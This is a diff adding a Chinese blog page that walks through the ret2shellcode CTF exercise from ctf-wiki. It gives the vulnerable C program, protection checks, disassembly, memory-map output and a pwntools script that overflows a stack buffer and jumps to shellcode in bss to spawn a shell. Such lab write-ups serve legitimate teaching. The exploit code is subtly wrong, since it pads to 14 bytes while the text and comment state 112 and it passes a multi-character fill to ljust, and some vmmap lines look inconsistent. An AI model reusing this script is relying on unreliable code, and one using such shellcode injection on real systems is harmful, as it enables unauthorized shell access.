@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="hollk">
+
+
+    <meta name="subtitle" content="ret2text">
+
+
+    <meta name="description" content="说人话，讲清楚，负责到底">
+
+
+    <meta name="keywords" content="ret2text,二进制,pwn,ctf-wiki">
+
+
+<title>好好说话之ret2shellcode | Hollk&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Hollk&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Hollk&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    <article class="post-wrap page">
+        
+        <h2 class="post-title">好好说话之ret2shellcode</h2>
+        
+        <section class="post-content">
+            <p>本题为ret2shellcode-example</p>
+<p>题目路径</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/ctf-challenges/</span>pwn<span class="regexp">/stackoverflow/</span>ret2shellcode<span class="regexp">/ret2shellcode-example</span></span><br></pre></td></tr></table></figure>
+
+<p>原理：ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限</p>
+<p>首先看C代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No system for you this time !!!\n"</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf2, buf, <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Checksec看一下这个程序的保护机制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec ret2shellcode</span></span><br><span class="line">[*] '/home/hollk/ctf-challenges/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ ret2shellcode'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>没有开启任何保护，并且在最后RWX指出程序具有读、写、执行权限。IDA看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>v4为gets函数接收数据长度范围，依据ret2text的方法可以得到字符串起始位置距离ret跳转0x6c+4个字节，接下来使用strncpy函数将按输入的内容复制到buf2变量当中。和ret2text不同的是ret2shellcode程序中并没有直接可以调用的”/bin/sh”可以用，没有也没关系，由于NX保护没有开启，我们可以自己构造shellcode放在栈中。接下来需要找存放shellcode的位置，由于输入的字符串存储在buf2变量当中，所以可以从buf2变量下手</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7Bo</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br></pre></td></tr></table></figure>
+
+<p>通过IDA可以找到buf2变量存放在bss段（0x0804A080），因为一会自己构造的shellcode需要存放在buf2变量中，而buf2变量存放在程序的bss段，所以需要通过gdb查看一下该程序是否在bss段具有执行权限，如果没有执行权限，连带着buf2变量中的shellcode就不可执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      &#x2F;home&#x2F;hollk&#x2F;ctf-challenges&#x2F;pwn&#x2F;stackoverflow &#x2F;ret2shellcode&#x2F;ret2shellcode-example&#x2F;ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      &#x2F;home&#x2F;hollk&#x2F;ctf-challenges&#x2F;pwn&#x2F;stackoverflow &#x2F;ret2shellcode&#x2F;ret2shellcode-example&#x2F;ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;hollk&#x2F;ctf-challenges&#x2F;pwn&#x2F;stackoverflow &#x2F;ret2shellcode&#x2F;ret2shellcode-example&#x2F;ret2shellcode</span><br><span class="line">0xf7ddd000 0xf7fb2000 r-xp   1d5000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb2000 0xf7fb3000 ---p     1000 1d5000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb5000 r-xp     2000 1d5000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb5000 0xf7fb6000 rwxp     1000 1d7000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb6000 0xf7fb9000 rwxp     3000 0      </span><br><span class="line">0xf7fd0000 0xf7fd2000 rwxp     2000 0      </span><br><span class="line">0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd5000 0xf7ffe000 rwxp    29000 0      &lt;explored&gt;</span><br><span class="line">0xf7fd6000 0xf7ffc000 r-xp    26000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 25000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 26000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br></pre></td></tr></table></figure>
+
+<p>通过gdb中vmmap命令可以查看程序各段执行权限，由于buf2存放地址为bss段的0x0804A080位置，结果显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;hollk&#x2F;ctf-challenges&#x2F;pwn&#x2F;stackoverflow &#x2F;ret2shellcode&#x2F;ret2shellcode-example&#x2F;ret2shellcode</span><br></pre></td></tr></table></figure>
+
+<p>可以看到执行权限为”rwxp”，所以该bss段具有执行权限，那么在buf2变量中写入shellcode就可以执行。</p>
+<p>EXP的思路：先使用字符串将整个可控内存空间填满，接下来覆盖saved edp和ret地址，在输入并回车后，字符串就会复制到buf2变量中，那么前期填充字符串的时候就可以使用shellcode字符串追加’A’这种形式进行填充，最后将buf2变量的地址覆盖到ret跳转位置，程序返回后会执行存放在buf2变量中的shellcode</p>
+<p>EXP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">buf2_add = <span class="number">0x0804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">14</span>,<span class="string">'hollkdig'</span>)+p32(buf2_add) <span class="comment">#112个字节+buf2_add</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+        </section>
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+	<br>
+	<span>© hollk | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+
+
+
+</footer>
+
+    </div>
+</body>
+</html>
